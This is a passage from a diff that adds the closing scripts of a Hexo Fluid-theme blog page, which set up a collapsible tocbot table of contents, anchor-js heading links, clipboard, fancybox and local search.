+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
